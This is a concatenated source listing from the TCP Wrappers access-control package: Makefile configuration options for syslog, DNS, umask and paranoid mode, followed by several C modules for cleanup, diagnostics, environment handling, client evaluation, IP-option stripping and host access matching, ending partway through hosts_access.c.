# Change the FACILITY definition below if you disagree with the default
# disposition. Some syslog versions (including Ultrix 4.x) do not provide
# this flexibility.
# 
# If nothing shows up on your system, it may be that the syslog records
# are sent to a dedicated loghost. It may also be that no syslog daemon
# is running at all. The README file gives pointers to surrogate syslog
# implementations for systems that have no syslog library routines or
# no syslog daemons. When changing the syslog.conf file, remember that
# there must be TABs between fields.
#
# The LOG_XXX names below are taken from the /usr/include/syslog.h file.

FACILITY= LOG_MAIL	# LOG_MAIL is what most sendmail daemons use

# The syslog priority at which successful connections are logged.

SEVERITY= LOG_INFO	# LOG_INFO is normally not logged to the console

###########################
# Optional: Reduce DNS load
#
# When looking up the address for a host.domain name, the typical DNS
# code will first append substrings of your own domain, so it tries
# host.domain.your.own.domain, then host.domain.own.domain, and then
# host.domain. The APPEND_DOT feature stops this waste of cycles. It is
# off by default because it causes problems on sites that don't use DNS
# and with Solaris < 2.4.
#
# DOT= -DAPPEND_DOT

##################################################
# Optional: Always attempt remote username lookups
#
# By default, the wrappers look up the remote username only when the
# access control rules require them to do so.
#
# Username lookups require that the remote host runs a daemon that
# supports an RFC 931 like protocol.  Remote user name lookups are not
# possible for UDP-based connections, and can cause noticeable delays
# with connections from non-UNIX PCs.  On some systems, remote username
# lookups can trigger a kernel bug, causing loss of service. The README
# file describes how to find out if your UNIX kernel has that problem.
# 
# Uncomment the following definition if the wrappers should always
# attempt to get the remote user name. If this is not enabled you can
# still do selective username lookups as documented in the hosts_access.5
# and hosts_options.5 manual pages (`nroff -man' format).
#
#AUTH	= -DALWAYS_RFC931
#
# The default username lookup timeout is 10 seconds. This may not be long
# enough for slow hosts or networks, but is enough to irritate PC users.

RFC931_TIMEOUT = 10

######################################################
# Optional: Changing the default file protection mask
#
# On many systems, network daemons and other system processes are started
# with a zero umask value, so that world-writable files may be produced.
# It is a good idea to edit your /etc/rc* files so that they begin with
# an explicit umask setting.  On our site we use `umask 022' because it
# does not break anything yet gives adequate protection against tampering.
# 
# The following macro specifies the default umask for processes run under
# control of the daemon wrappers. Comment it out only if you are certain
# that inetd and its children are started with a safe umask value.

UMASK	= -DDAEMON_UMASK=022

#######################################
# Optional: Turning off access control
#
# By default, host access control is enabled.  To disable host access
# control, comment out the following definition.  Host access control
# can also be turned off at runtime by providing no or empty access
# control tables.

ACCESS	= -DHOSTS_ACCESS

########################################################
# Optional: Changing the access control table pathnames
#
# The HOSTS_ALLOW and HOSTS_DENY macros define where the programs will
# look for access control information. Watch out for the quotes and
# backslashes when you make changes.

TABLES	= -DHOSTS_DENY=\"/etc/hosts.deny\" -DHOSTS_ALLOW=\"/etc/hosts.allow\"

####################################################
# Optional: dealing with host name/address conflicts
#
# By default, the software tries to protect against hosts that claim to
# have someone elses host name. This is relevant for network services
# whose authentication depends on host names, such as rsh and rlogin.
#
# With paranoid mode on, connections will be rejected when the host name
# does not match the host address. Connections will also be rejected when
# the host name is available but cannot be verified.
#
# Comment out the following definition if you want more control over such
# requests. When paranoid mode is off and a host name double check fails,
# the client can be matched with the PARANOID access control pattern.
#
# Paranoid mode implies hostname lookup. In order to disable hostname
# lookups altogether, see the next section.

PARANOID= -DPARANOID

########################################
# Optional: turning off hostname lookups
#
# By default, the software always attempts to look up the client
# hostname.  With selective hostname lookups, the client hostname
# lookup is postponed until the name is required by an access control
# rule or by a %letter expansion.
# 
# In order to perform selective hostname lookups, disable paranoid
# mode (see previous section) and comment out the following definition.

HOSTNAME= -DALWAYS_HOSTNAME

#############################################
# Optional: Turning on host ADDRESS checking
#
# Optionally, the software tries to protect against hosts that pretend to
# have someone elses host address. This is relevant for network services
# whose authentication depends on host names, such as rsh and rlogin,
# because the network address is used to look up the remote host name.
# 
# The protection is effective only when the offending host claims to have
# a network address that lies outside its own network.
#
# My site has been running rlogind and rshd daemons that implement this
# feature for more than 2 years, and without any ill effects.
#
# This feature cannot be used with SunOS 4.x because of a kernel bug in
# the implementation of the getsockopt() system call. Kernel panics have
# been observed for SunOS 4.1.[1-3]. Symptoms are "BAD TRAP" and "Data
# fault" while executing the tcp_ctloutput() kernel function.
#
# Reportedly, Sun patch 100804-03 or 101790 fixes this for SunOS 4.1.x.
#
# Uncomment the following macro definition if your getsockopt() is OK.
#
# KILL_OPT= -DKILL_IP_OPTIONS

## End configuration options
############################

# Protection against weird shells or weird make programs.

SHELL	= /bin/sh
.c.o:;	$(CC) $(CFLAGS) -c $*.c

CFLAGS	= -O -DFACILITY=$(FACILITY) $(ACCESS) $(PARANOID) $(NETGROUP) \
	$(BUGS) $(SYSTYPE) $(AUTH) $(UMASK) \
	-DREAL_DAEMON_DIR=\"$(REAL_DAEMON_DIR)\" $(STYLE) $(KILL_OPT) \
	-DSEVERITY=$(SEVERITY) -DRFC931_TIMEOUT=$(RFC931_TIMEOUT) \
	$(UCHAR) $(TABLES) $(STRINGS) $(TLI) $(EXTRA_CFLAGS) $(DOT) \
	$(VSYSLOG) $(HOSTNAME)

LIB_OBJ= hosts_access.o options.o shell_cmd.o rfc931.o eval.o \
	hosts_ctl.o refuse.o percent_x.o clean_exit.o $(AUX_OBJ) \
	$(FROM_OBJ) fix_options.o socket.o tli.o workarounds.o \
	update.o misc.o diag.o percent_m.o myvsyslog.o

FROM_OBJ= fromhost.o

KIT	= README miscd.c tcpd.c fromhost.c hosts_access.c shell_cmd.c \
	tcpd.h tcpdmatch.c Makefile hosts_access.5 strcasecmp.c BLURB rfc931.c \
	tcpd.8 eval.c hosts_access.3 hosts_ctl.c percent_x.c options.c \
	clean_exit.c environ.c patchlevel.h fix_options.c workarounds.c \
	socket.c tli.c DISCLAIMER fakelog.c safe_finger.c hosts_options.5 \
	CHANGES try-from.c update.c ptx.c vfprintf.c tli-sequent.c \
	tli-sequent.h misc.c diag.c ncr.c tcpdchk.c percent_m.c \
	myvsyslog.c mystdarg.h printf.ck README.IRIX Banners.Makefile \
	refuse.c tcpdchk.8 setenv.c inetcf.c inetcf.h scaffold.c \
	scaffold.h tcpdmatch.8 README.NIS

LIB	= libwrap.a

all other: config-check tcpd

# Invalidate all object files when the compiler options (CFLAGS) have changed.

config-check:
	@set +e; test -n "$(REAL_DAEMON_DIR)" || { make; exit 1; }
	@set +e; echo $(CFLAGS) >/tmp/cflags.$$$$ ; \
	if cmp cflags /tmp/cflags.$$$$ ; \
	then rm /tmp/cflags.$$$$ ; \
	else mv /tmp/cflags.$$$$ cflags ; \
	fi >/dev/null 2>/dev/null

$(LIB):	$(LIB_OBJ)
	rm -f $(LIB)
	$(AR) $(ARFLAGS) $(LIB) $(LIB_OBJ)
	-$(RANLIB) $(LIB)

tcpd:	tcpd.o $(LIB)
	$(CC) $(CFLAGS) -o $@ tcpd.o $(LIB) $(LIBS)

TCPDMATCH_OBJ = tcpdmatch.o fakelog.o inetcf.o scaffold.o

TCPDCHK_OBJ = tcpdchk.o fakelog.o inetcf.o scaffold.o

archive:
	$(ARCHIVE) $(KIT)

clean:
	rm -f tcpd miscd safe_finger tcpdmatch tcpdchk try-from *.[oa] core \
	cflags

tidy:	clean
	chmod -R a+r .
	chmod 755 .

# Enable all bells and whistles for linting.

lint: tcpd_lint miscd_lint match_lint chk_lint

tcpd_lint:
	lint -DFACILITY=LOG_MAIL -DHOSTS_ACCESS -DPARANOID -DNETGROUP \
	-DGETPEERNAME_BUG -DDAEMON_UMASK=022 -DSEVERITY=$(SEVERITY) \
	$(TABLES) -DKILL_IP_OPTIONS -DPROCESS_OPTIONS \
	-DRFC931_TIMEOUT=$(RFC931_TIMEOUT) -DALWAYS_RFC931 \
	-DREAL_DAEMON_DIR=\"$(REAL_DAEMON_DIR)\" \
	-Dvsyslog=myvsyslog \
	tcpd.c fromhost.c socket.c tli.c hosts_access.c \
	shell_cmd.c refuse.c rfc931.c eval.c percent_x.c clean_exit.c \
	options.c setenv.c fix_options.c workarounds.c update.c misc.c \
	diag.c myvsyslog.c percent_m.c

miscd_lint:
	lint -DFACILITY=LOG_MAIL -DHOSTS_ACCESS -DPARANOID -DNETGROUP \
	-DGETPEERNAME_BUG -DDAEMON_UMASK=022 -DSEVERITY=$(SEVERITY) \
	$(TABLES) -DKILL_IP_OPTIONS -DPROCESS_OPTIONS \
	-DRFC931_TIMEOUT=$(RFC931_TIMEOUT) -DALWAYS_RFC931 \
	-DREAL_DAEMON_DIR=\"$(REAL_DAEMON_DIR)\" \
	-Dvsyslog=myvsyslog \
	miscd.c fromhost.c socket.c tli.c hosts_access.c \
	shell_cmd.c refuse.c rfc931.c eval.c percent_x.c clean_exit.c \
	options.c setenv.c fix_options.c workarounds.c update.c misc.c \
	diag.c myvsyslog.c percent_m.c

match_lint:
	lint -DFACILITY=LOG_MAIL -DSEVERITY=$(SEVERITY) -DHOSTS_ACCESS \
	-DPARANOID $(TABLES) -DNETGROUP -DPROCESS_OPTIONS -DRFC931_TIMEOUT=10 \
	-DREAL_DAEMON_DIR=\"$(REAL_DAEMON_DIR)\" \
	-Dvsyslog=myvsyslog \
	tcpdmatch.c hosts_access.c eval.c percent_x.c options.c workarounds.c \
	update.c socket.c misc.c diag.c myvsyslog.c percent_m.c setenv.c \
	inetcf.c scaffold.c

chk_lint:
	lint -DFACILITY=LOG_MAIL -DSEVERITY=$(SEVERITY) -DHOSTS_ACCESS \
	-DPARANOID $(TABLES) -DNETGROUP -DPROCESS_OPTIONS -DRFC931_TIMEOUT=10 \
	-DREAL_DAEMON_DIR=\"$(REAL_DAEMON_DIR)\" \
	-Dvsyslog=myvsyslog \
	tcpdchk.c eval.c percent_x.c options.c update.c workarounds.c \
	setenv.c misc.c diag.c myvsyslog.c percent_m.c inetcf.c scaffold.c

printfck:
	printfck -f printf.ck \
	tcpd.c fromhost.c socket.c tli.c hosts_access.c \
	shell_cmd.c refuse.c rfc931.c eval.c percent_x.c clean_exit.c \
	options.c setenv.c fix_options.c workarounds.c update.c misc.c \
	diag.c myvsyslog.c percent_m.c >aap.c
	lint -DFACILITY=LOG_MAIL -DHOSTS_ACCESS -DPARANOID -DNETGROUP \
	-DGETPEERNAME_BUG -DDAEMON_UMASK=022 -DSEVERITY=$(SEVERITY) \
	$(TABLES) -DKILL_IP_OPTIONS -DPROCESS_OPTIONS \
	-DRFC931_TIMEOUT=$(RFC931_TIMEOUT) -DALWAYS_RFC931 \
	-DREAL_DAEMON_DIR=\"$(REAL_DAEMON_DIR)\" -Dvsyslog=myvsyslog aap.c
	printfck -f printf.ck \
	tcpdchk.c eval.c percent_x.c options.c update.c workarounds.c \
	setenv.c misc.c diag.c myvsyslog.c percent_m.c inetcf.c scaffold.c \
	>aap.c
	lint -DFACILITY=LOG_MAIL -DSEVERITY=$(SEVERITY) -DHOSTS_ACCESS \
	-DPARANOID $(TABLES) -DNETGROUP -DPROCESS_OPTIONS -DRFC931_TIMEOUT=10 \
	-Dvsyslog=myvsyslog -DREAL_DAEMON_DIR=\"$(REAL_DAEMON_DIR)\"

# Internal compilation dependencies.

clean_exit.o: cflags
clean_exit.o: tcpd.h
diag.o: cflags
diag.o: mystdarg.h
diag.o: tcpd.h
environ.o: cflags
eval.o: cflags
eval.o: tcpd.h
fakelog.o: cflags
fakelog.o: mystdarg.h
fix_options.o: cflags
fix_options.o: tcpd.h
fromhost.o: cflags
fromhost.o: tcpd.h
hosts_access.o: cflags
hosts_access.o: tcpd.h
hosts_ctl.o: cflags
hosts_ctl.o: tcpd.h
inetcf.o: cflags
inetcf.o: inetcf.h
inetcf.o: tcpd.h
misc.o: cflags
misc.o: tcpd.h
miscd.o: cflags
miscd.o: patchlevel.h
miscd.o: tcpd.h
myvsyslog.o: cflags
myvsyslog.o: mystdarg.h
myvsyslog.o: tcpd.h
ncr.o: cflags
ncr.o: tcpd.h
options.o: cflags
options.o: tcpd.h
percent_m.o: cflags
percent_m.o: mystdarg.h
percent_x.o: cflags
percent_x.o: tcpd.h
ptx.o: cflags
ptx.o: tcpd.h
refuse.o: cflags
refuse.o: tcpd.h
rfc931.o: cflags
rfc931.o: tcpd.h
safe_finger.o: cflags
scaffold.o: cflags
scaffold.o: scaffold.h
scaffold.o: tcpd.h
setenv.o: cflags
shell_cmd.o: cflags
shell_cmd.o: tcpd.h
socket.o: cflags
socket.o: tcpd.h
strcasecmp.o: cflags
tcpd.o: cflags
tcpd.o: patchlevel.h
tcpd.o: tcpd.h
tcpdchk.o: cflags
tcpdchk.o: inetcf.h
tcpdchk.o: scaffold.h
tcpdchk.o: tcpd.h
tcpdmatch.o: cflags
tcpdmatch.o: scaffold.h
tcpdmatch.o: tcpd.h
tli-sequent.o: cflags
tli-sequent.o: tcpd.h
tli-sequent.o: tli-sequent.h
tli.o: cflags
tli.o: tcpd.h
try-from.o: cflags
try-from.o: tcpd.h
update.o: cflags
update.o: mystdarg.h
update.o: tcpd.h
vfprintf.o: cflags
workarounds.o: cflags
workarounds.o: tcpd.h
 /*
  * clean_exit() cleans up and terminates the program. It should be called
  * instead of exit() when for some reason the real network daemon will not or
  * cannot be run. Reason: in the case of a datagram-oriented service we must
  * discard the not-yet received data from the client. Otherwise, inetd will
  * see the same datagram again and again, and go into a loop.
  * 
  * Author: Wietse Venema, Eindhoven University of Technology, The Netherlands.
  */

#ifndef lint
static char sccsid[] = "@(#) clean_exit.c 1.4 94/12/28 17:42:19";
#endif

#include <stdio.h>

extern void exit();

#include "tcpd.h"

/* clean_exit - clean up and exit */

void    clean_exit(request)
struct request_info *request;
{

    /*
     * In case of unconnected protocols we must eat up the not-yet received
     * data or inetd will loop.
     */

    if (request->sink)
	request->sink(request->fd);

    /*
     * Be kind to the inetd. We already reported the problem via the syslogd,
     * and there is no need for additional garbage in the logfile.
     */

    sleep(5);
    exit(0);
}
 /*
  * Routines to report various classes of problems. Each report is decorated
  * with the current context (file name and line number), if available.
  * 
  * tcpd_warn() reports a problem and proceeds.
  * 
  * tcpd_jump() reports a problem and jumps.
  * 
  * Author: Wietse Venema, Eindhoven University of Technology, The Netherlands.
  */

#ifndef lint
static char sccsid[] = "@(#) diag.c 1.1 94/12/28 17:42:20";
#endif

/* System libraries */

#include <syslog.h>
#include <stdio.h>
#include <setjmp.h>

/* Local stuff */

#include "tcpd.h"
#include "mystdarg.h"

struct tcpd_context tcpd_context;
jmp_buf tcpd_buf;

/* tcpd_diag - centralize error reporter */

static void tcpd_diag(severity, tag, format, ap)
int     severity;
char   *tag;
char   *format;
va_list ap;
{
    char    fmt[BUFSIZ];

    if (tcpd_context.file)
	sprintf(fmt, "%s: %s, line %d: %s",
		tag, tcpd_context.file, tcpd_context.line, format);
    else
	sprintf(fmt, "%s: %s", tag, format);
    vsyslog(severity, fmt, ap);
}

/* tcpd_warn - report problem of some sort and proceed */

void    VARARGS(tcpd_warn, char *, format)
{
    va_list ap;

    VASTART(ap, char *, format);
    tcpd_diag(LOG_ERR, "warning", format, ap);
    VAEND(ap);
}

/* tcpd_jump - report serious problem and jump */

void    VARARGS(tcpd_jump, char *, format)
{
    va_list ap;

    VASTART(ap, char *, format);
    tcpd_diag(LOG_ERR, "error", format, ap);
    VAEND(ap);
    longjmp(tcpd_buf, AC_ERROR);
}
/*
 * Many systems have putenv() but no setenv(). Other systems have setenv()
 * but no putenv() (MIPS). Still other systems have neither (NeXT). This is a
 * re-implementation that hopefully ends all problems.
 *
 * Author: Wietse Venema, Eindhoven University of Technology, The Netherlands.
 */

#ifndef lint
static char sccsid[] = "@(#) environ.c 1.2 94/03/23 16:09:46";
#endif

/* System libraries. */

extern char **environ;
extern char *strchr();
extern char *strcpy();
extern char *strncpy();
extern char *malloc();
extern char *realloc();
extern int strncmp();
extern void free();

#ifdef no_memcpy
#define memcpy(d,s,l) bcopy(s,d,l)
#else
extern char *memcpy();
#endif

/* Local stuff. */

static int addenv();			/* append entry to environment */

static int allocated = 0;		/* environ is, or is not, allocated */

#define DO_CLOBBER	1

/* namelength - determine length of name in "name=whatever" */

static int namelength(name)
char   *name;
{
    char   *equal;

    equal = strchr(name, '=');
    return ((equal == 0) ? strlen(name) : (equal - name));
}

/* findenv - given name, locate name=value */

static char **findenv(name, len)
char   *name;
int     len;
{
    char  **envp;

    for (envp = environ; envp && *envp; envp++)
	if (strncmp(name, *envp, len) == 0 && (*envp)[len] == '=')
	    return (envp);
    return (0);
}

/* getenv - given name, locate value */

char   *getenv(name)
char   *name;
{
    int     len = namelength(name);
    char  **envp = findenv(name, len);

    return (envp ? *envp + len + 1 : 0);
}

/* putenv - update or append environment (name,value) pair */

int     putenv(nameval)
char   *nameval;
{
    char   *equal = strchr(nameval, '=');
    char   *value = (equal ? equal : "");

    return (setenv(nameval, value, DO_CLOBBER));
}

/* unsetenv - remove variable from environment */

void    unsetenv(name)
char   *name;
{
    char  **envp;

    if ((envp = findenv(name, namelength(name))) != 0)
	while (envp[0] = envp[1])
	    envp++;
}

/* setenv - update or append environment (name,value) pair */

int     setenv(name, value, clobber)
char   *name;
char   *value;
int     clobber;
{
    char   *destination;
    char  **envp;
    int     l_name;			/* length of name part */
    int     l_nameval;			/* length of name=value */

    /* Permit name= and =value. */

    l_name = namelength(name);
    envp = findenv(name, l_name);
    if (envp != 0 && clobber == 0)
	return (0);
    if (*value == '=')
	value++;
    l_nameval = l_name + strlen(value) + 1;

    /*
     * Use available memory if the old value is long enough. Never free an
     * old name=value entry because it may not be allocated.
     */

    destination = (envp != 0 && strlen(*envp) >= l_nameval) ?
	*envp : malloc(l_nameval + 1);
    if (destination == 0)
	return (-1);
    strncpy(destination, name, l_name);
    destination[l_name] = '=';
    strcpy(destination + l_name + 1, value);
    return ((envp == 0) ? addenv(destination) : (*envp = destination, 0));
}

/* cmalloc - malloc and copy block of memory */

static char *cmalloc(new_len, old, old_len)
char   *old;
int     old_len;
{
    char   *new = malloc(new_len);

    if (new != 0)
	memcpy(new, old, old_len);
    return (new);
}

/* addenv - append environment entry */

static int addenv(nameval)
char   *nameval;
{
    char  **envp;
    int     n_used;			/* number of environment entries */
    int     l_used;			/* bytes used excl. terminator */
    int     l_need;			/* bytes needed incl. terminator */

    for (envp = environ; envp && *envp; envp++)
	 /* void */ ;
    n_used = envp - environ;
    l_used = n_used * sizeof(*envp);
    l_need = l_used + 2 * sizeof(*envp);

    envp = allocated ?
	(char **) realloc((char *) environ, l_need) :
	(char **) cmalloc(l_need, (char *) environ, l_used);
    if (envp == 0) {
	return (-1);
    } else {
	allocated = 1;
	environ = envp;
	environ[n_used++] = nameval;		/* add new entry */
	environ[n_used] = 0;			/* terminate list */
	return (0);
    }
}

#ifdef TEST

 /*
  * Stand-alone program for test purposes.
  */

/* printenv - display environment */

static void printenv()
{
    char  **envp;

    for (envp = environ; envp && *envp; envp++)
	printf("%s\n", *envp);
}

int     main(argc, argv)
int     argc;
char  **argv;
{
    char   *cp;
    int     changed = 0;

    if (argc < 2) {
	printf("usage: %s name[=value]...\n", argv[0]);
	return (1);
    }
    while (--argc && *++argv) {
	if (argv[0][0] == '-') {		/* unsetenv() test */
	    unsetenv(argv[0] + 1);
	    changed = 1;
	} else if (strchr(argv[0], '=') == 0) {	/* getenv() test */
	    cp = getenv(argv[0]);
	    printf("%s: %s\n", argv[0], cp ? cp : "not found");
	} else {				/* putenv() test */
	    if (putenv(argv[0])) {
		perror("putenv");
		return (1);
	    }
	    changed = 1;
	}
    }
    if (changed)
	printenv();
    return (0);
}

#endif /* TEST */
 /*
  * Routines for controlled evaluation of host names, user names, and so on.
  * They are, in fact, wrappers around the functions that are specific for
  * the sockets or TLI programming interfaces. The request_info and host_info
  * structures are used for result cacheing.
  * 
  * These routines allows us to postpone expensive operations until their
  * results are really needed. Examples are hostname lookups and double
  * checks, or username lookups. Information that cannot be retrieved is
  * given the value "unknown" ("paranoid" in case of hostname problems).
  * 
  * When ALWAYS_HOSTNAME is off, hostname lookup is done only when required by
  * tcpd paranoid mode, by access control patterns, or by %letter expansions.
  * 
  * When ALWAYS_RFC931 mode is off, user lookup is done only when required by
  * access control patterns or %letter expansions.
  * 
  * Author: Wietse Venema, Eindhoven University of Technology, The Netherlands.
  */

#ifndef lint
static char sccsid[] = "@(#) eval.c 1.3 95/01/30 19:51:45";
#endif

/* System libraries. */

#include <stdio.h>
#include <string.h>

/* Local stuff. */

#include "tcpd.h"

 /*
  * When a string has the value STRING_UNKNOWN, it means: don't bother, I
  * tried to look up the data but it was unavailable for some reason. When a
  * host name has the value STRING_PARANOID it means there was a name/address
  * conflict.
  */
char    unknown[] = STRING_UNKNOWN;
char    paranoid[] = STRING_PARANOID;

/* eval_user - look up user name */

char   *eval_user(request)
struct request_info *request;
{
    if (request->user[0] == 0) {
	strcpy(request->user, unknown);
	if (request->sink == 0 && request->client->sin && request->server->sin)
	    rfc931(request->client->sin, request->server->sin, request->user);
    }
    return (request->user);
}

/* eval_hostaddr - look up printable address */

char   *eval_hostaddr(host)
struct host_info *host;
{
    if (host->addr[0] == 0) {
	strcpy(host->addr, unknown);
	if (host->request->hostaddr != 0)
	    host->request->hostaddr(host);
    }
    return (host->addr);
}

/* eval_hostname - look up host name */

char   *eval_hostname(host)
struct host_info *host;
{
    if (host->name[0] == 0) {
	strcpy(host->name, unknown);
	if (host->request->hostname != 0)
	    host->request->hostname(host);
    }
    return (host->name);
}

/* eval_hostinfo - return string with host name (preferred) or address */

char   *eval_hostinfo(host)
struct host_info *host;
{
    char   *hostname;

#ifndef ALWAYS_HOSTNAME				/* no implicit host lookups */
    if (host->name[0] == 0)
	return (eval_hostaddr(host));
#endif
    hostname = eval_hostname(host);
    if (HOSTNAME_KNOWN(hostname)) {
	return (host->name);
    } else {
	return (eval_hostaddr(host));
    }
}

/* eval_client - return string with as much about the client as we know */

char   *eval_client(request)
struct request_info *request;
{
    static char both[2 * STRING_LENGTH];
    char   *hostinfo = eval_hostinfo(request->client);

#ifndef ALWAYS_RFC931				/* no implicit user lookups */
    if (request->user[0] == 0)
	return (hostinfo);
#endif
    if (STR_NE(eval_user(request), unknown)) {
	sprintf(both, "%s@%s", request->user, hostinfo);
	return (both);
    } else {
	return (hostinfo);
    }
}

/* eval_server - return string with as much about the server as we know */

char   *eval_server(request)
struct request_info *request;
{
    static char both[2 * STRING_LENGTH];
    char   *host = eval_hostinfo(request->server);
    char   *daemon = eval_daemon(request);

    if (STR_NE(host, unknown)) {
	sprintf(both, "%s@%s", daemon, host);
	return (both);
    } else {
	return (daemon);
    }
}
 /*
  * This module intercepts syslog() library calls and redirects their output
  * to the standard output stream. For interactive testing.
  * 
  * Author: Wietse Venema, Eindhoven University of Technology, The Netherlands.
  */

#ifndef lint
static char sccsid[] = "@(#) fakelog.c 1.3 94/12/28 17:42:21";
#endif

#include <stdio.h>

#include "mystdarg.h"

/* openlog - dummy */

/* ARGSUSED */

openlog(name, logopt, facility)
char   *name;
int     logopt;
int     facility;
{
    /* void */
}

/* vsyslog - format one record */

vsyslog(severity, fmt, ap)
int     severity;
char   *fmt;
va_list ap;
{
    char    buf[BUFSIZ];

    vprintf(percent_m(buf, fmt), ap);
    printf("\n");
    fflush(stdout);
}

/* syslog - format one record */

/* VARARGS */

VARARGS(syslog, int, severity)
{
    va_list ap;
    char   *fmt;

    VASTART(ap, int, severity);
    fmt = va_arg(ap, char *);
    vsyslog(severity, fmt, ap);
    VAEND(ap);
}

/* closelog - dummy */

closelog()
{
    /* void */
}
 /*
  * Routine to disable IP-level socket options. This code was taken from 4.4BSD
  * rlogind source, but all mistakes in it are my fault.
  *
  * Author: Wietse Venema, Eindhoven University of Technology, The Netherlands.
  */

#ifndef lint
static char sccsid[] = "@(#) fix_options.c 1.3 94/12/28 17:42:22";
#endif

#include <sys/types.h>
#include <sys/param.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdio.h>
#include <syslog.h>

#include "tcpd.h"

/* fix_options - get rid of IP-level socket options */

fix_options(request)
struct request_info *request;
{
#ifdef IP_OPTIONS
    unsigned char optbuf[BUFSIZ / 3], *cp;
    char    lbuf[BUFSIZ], *lp;
    int     optsize = sizeof(optbuf), ipproto;
    struct protoent *ip;
    int     fd = request->fd;

    if ((ip = getprotobyname("ip")) != 0)
	ipproto = ip->p_proto;
    else
	ipproto = IPPROTO_IP;

    if (getsockopt(fd, ipproto, IP_OPTIONS, (char *) optbuf, &optsize) == 0
	&& optsize != 0) {
	lp = lbuf;
	for (cp = optbuf; optsize > 0; cp++, optsize--, lp += 3)
	    sprintf(lp, " %2.2x", *cp);
	syslog(LOG_NOTICE,
	       "connect from %s with IP options (ignored):%s",
	       eval_client(request), lbuf);
	if (setsockopt(fd, ipproto, IP_OPTIONS, (char *) 0, optsize) != 0) {
	    syslog(LOG_ERR, "setsockopt IP_OPTIONS NULL: %m");
	    clean_exit(request);
	}
    }
#endif
}
 /*
  * On socket-only systems, fromhost() is nothing but an alias for the
  * socket-specific sock_host() function.
  * 
  * On systems with sockets and TLI, fromhost() determines the type of API
  * (sockets, TLI), then invokes the appropriate API-specific routines.
  * 
  * Diagnostics are reported through syslog(3).
  * 
  * Author: Wietse Venema, Eindhoven University of Technology, The Netherlands.
  */

#ifndef lint
static char sccsid[] = "@(#) fromhost.c 1.17 94/12/28 17:42:23";
#endif

#if defined(TLI) || defined(PTX) || defined(TLI_SEQUENT)

/* System libraries. */

#include <sys/types.h>
#include <sys/tiuser.h>
#include <stropts.h>

/* Local stuff. */

#include "tcpd.h"

/* fromhost - find out what network API we should use */

void    fromhost(request)
struct request_info *request;
{

    /*
     * On systems with streams support the IP network protocol family may be
     * accessible via more than one programming interface: Berkeley sockets
     * and the Transport Level Interface (TLI).
     * 
     * Thus, we must first find out what programming interface to use: sockets
     * or TLI. On some systems, sockets are not part of the streams system,
     * so if request->fd is not a stream we simply assume sockets.
     */

    if (ioctl(request->fd, I_FIND, "timod") > 0) {
	tli_host(request);
    } else {
	sock_host(request);
    }
}

#endif /* TLI || PTX || TLI_SEQUENT */
 /*
  * This module implements a simple access control language that is based on
  * host (or domain) names, NIS (host) netgroup names, IP addresses (or
  * network numbers) and daemon process names. When a match is found the
  * search is terminated, and depending on whether PROCESS_OPTIONS is defined,
  * a list of options is executed or an optional shell command is executed.
  * 
  * Host and user names are looked up on demand, provided that suitable endpoint
  * information is available as sockaddr_in structures or TLI netbufs. As a
  * side effect, the pattern matching process may change the contents of
  * request structure fields.
  * 
  * Diagnostics are reported through syslog(3).
  * 
  * Compile with -DNETGROUP if your library provides support for netgroups.
  * 
  * Author: Wietse Venema, Eindhoven University of Technology, The Netherlands.
  */

#ifndef lint
static char sccsid[] = "@(#) hosts_access.c 1.20 96/02/11 17:01:27";
#endif

/* System libraries. */

#include <sys/types.h>
#include <sys/param.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <syslog.h>
#include <ctype.h>
#include <errno.h>
#include <setjmp.h>
#include <string.h>

extern char *fgets();
extern int errno;

#ifndef	INADDR_NONE
#define	INADDR_NONE	(-1)		/* XXX should be 0xffffffff */
#endif

/* Local stuff. */

#include "tcpd.h"

/* Error handling. */

extern jmp_buf tcpd_buf;

/* Delimiters for lists of daemons or clients. */

static char sep[] = ", \t\r\n";

/* Constants to be used in assignments only, not in comparisons... */

#define	YES		1
#define	NO		0

 /*
  * These variables are globally visible so that they can be redirected in
  * verification mode.
  */

char   *hosts_allow_table = HOSTS_ALLOW;
char   *hosts_deny_table = HOSTS_DENY;
int     hosts_access_verbose = 0;

 /*
  * In a long-running process, we are not at liberty to just go away.
  */

int     resident = (-1);		/* -1, 0: unknown; +1: yes */

/* Forward declarations. */

static int table_match();
static int list_match();
static int server_match();
static int client_match();
static int host_match();
static int string_match();
static int masked_match();

/* Size of logical line buffer. */

#define	BUFLEN 2048

/* hosts_access - host access control facility */

int     hosts_access(request)
struct request_info *request;
{
    int     verdict;

    /*
     * If the (daemon, client) pair is matched by an entry in the file
     * /etc/hosts.allow, access is granted. Otherwise, if the (daemon,
     * client) pair is matched by an entry in the file /etc/hosts.deny,
     * access is denied. Otherwise, access is granted. A non-existent
     * access-control file is treated as an empty file.
     * 
     * After a rule has been matched, the optional language extensions may
     * decide to grant or refuse service anyway. Or, while a rule is being
     * processed, a serious error is found, and it seems better to play safe
     * and deny service. All this is done by jumping back into the
     * hosts_access() routine, bypassing the regular return from the
     * table_match() function calls below.
     */

    if (resident <= 0)
	resident++;
    if ((verdict = setjmp(tcpd_buf)) != 0)
	return (verdict == AC_PERMIT);
    if (table_match(hosts_allow_table, request))
	return (YES);
    if (table_match(hosts_deny_table, request))
	return (NO);
    return (YES);
}

/* table_match - match table entries with (daemon, client) pair */

static int table_match(table, request)
char   *table;
struct request_info *request;
{
    FILE   *fp;
    char    sv_list[BUFLEN];		/* becomes list of daemons */
    char   *cl_list;			/* becomes list of clients */
    char   *sh_cmd;			/* becomes optional shell command */
    int     match = NO;
    struct tcpd_context saved_context;

    saved_context = tcpd_context;		/* stupid compilers */

    /*
     * Between the fopen() and fclose() calls, avoid jumps that may cause
     * file descriptor leaks.
     */

    if ((fp = fopen(table, "r")) != 0) {
	tcpd_context.file = table;
	tcpd_context.line = 0;
	while (match == NO && xgets(sv_list, sizeof(sv_list), fp) != 0) {
	    if (sv_list[strlen(sv_list) - 1] != '\n') {
		tcpd_warn("missing newline or line too long");
		continue;
	    }
	    if (sv_list[0] == '#' || sv_list[strspn(sv_list, " \t\r\n")] == 0)
		continue;
	    if ((cl_list = split_at(sv_list, ':')) == 0) {
		tcpd_warn("missing \":\" separator");
		continue;
	    }
	    sh_cmd = split_at(cl_list, ':');
	    match = list_match(sv_list, request, server_match)
		&& list_match(cl_list, request, client_match);
	}
	(void) fclose(fp);
    } else if (errno != ENOENT) {
	tcpd_warn("cannot open %s: %m", table);
    }
    if (match) {
	if (hosts_access_verbose > 1)
	    syslog(LOG_DEBUG, "matched:  %s line %d",
		   tcpd_context.file, tcpd_context.line);
